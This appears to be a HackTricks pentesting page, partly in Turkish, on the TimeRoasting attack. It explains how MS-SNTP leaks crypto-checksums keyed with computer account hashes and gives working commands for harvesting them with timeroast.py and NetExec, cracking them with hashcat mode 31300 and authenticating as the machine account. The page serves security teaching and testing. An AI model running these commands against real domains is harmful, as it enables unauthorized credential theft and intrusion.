# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting, legacy MS-SNTP authentication extension'ını suistimal eder. MS-SNTP'de bir client, herhangi bir computer account RID'sini gömerek 68 baytlık bir istek gönderebilir; domain controller, cevap üzerinde MAC hesaplamak için computer account'un NTLM hash'ini (MD4) anahtar olarak kullanır ve yanıtı döner. Saldırganlar bu MS-SNTP MAC'lerini kimlik doğrulaması olmadan toplayıp çevrimdışı kırarak (Hashcat mode 31300) computer account parolalarını elde edebilirler.

Detaylar için resmi MS-SNTP spec'inde section 3.1.5.1 "Authentication Request Behavior" ve 4 "Protocol Examples" bölümlerine bakın.
![](../../images/Pasted%20image%2020250709114508.png)
When the ExtendedAuthenticatorSupported ADM element is false, the client sends a 68-byte request and embeds the RID in the least significant 31 bits of the Key Identifier subfield of the authenticator.

> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

> Eğer ExtendedAuthenticatorSupported ADM element false ise, istemci bir Client NTP Request message oluşturmalıdır. Client NTP Request message uzunluğu 68 bayttır. İstemci, Client NTP Request message içindeki Authenticator alanını section 2.2.1'de açıklandığı şekilde ayarlar; RID değerinin en az anlamlı 31 bitini authenticator içindeki Key Identifier subfield'in en az anlamlı 31 bitine yazar ve ardından Key Selector değerini Key Identifier subfield'in en anlamlı bitine yazar.

From section 4 (Protocol Examples):

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

> İsteği aldıktan sonra server, alınan mesaj boyutunun 68 bayt olduğunu doğrular. Alınan mesaj boyutunun 68 bayt olduğu varsayıldığında, server gelen mesajdan RID'i çıkarır. Server, crypto-checksums hesaplamak ve alınan mesajdaki Key Identifier subfield'in en anlamlı bitine göre crypto-checksum'u seçmek için NetrLogonComputeServerDigest metodunu ([MS-NRPC] section 3.5.4.8.2'de belirtildiği şekilde) çağırır; bu işlem section 3.2.5'te belirtildiği gibidir. Server daha sonra Key Identifier alanını 0 ve Crypto-Checksum alanını hesaplanmış crypto-checksum ile ayarlayarak istemciye bir yanıt gönderir.

The crypto-checksum is MD5-based (see 3.2.5.1.1) and can be cracked offline, enabling the roasting attack.

Crypto-checksum MD5 tabanlıdır (bkz. 3.2.5.1.1) ve çevrimdışı kırılabilir; bu, roasting attack'a olanak tanır.

## Saldırı Nasıl Yapılır

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scriptleri by Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Pratik saldırı (yetkisiz) NetExec + Hashcat ile

- NetExec, bilgisayar RIDs için MS-SNTP MACs'lerini yetkisiz olarak listeleyip toplayabilir ve kırılmaya hazır $sntp-ms$ hash'lerini yazdırabilir:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Çevrimdışı Crack için Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Kurtarılan cleartext, bir bilgisayar hesabı parolasına karşılık gelir. NTLM devre dışı bırakıldığında Kerberos (-k) kullanarak doğrudan makine hesabı olarak deneyin:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operasyonel ipuçları
- Kerberos'tan önce doğru zaman senkronizasyonunu sağlayın: `sudo ntpdate <dc_fqdn>`
- Gerekirse, AD realm için krb5.conf oluşturun: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Herhangi bir kimlik doğrulanmış foothold elde ettiğinizde RIDs'i daha sonra LDAP/BloodHound aracılığıyla principals ile eşleyin.

## Referanslar

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
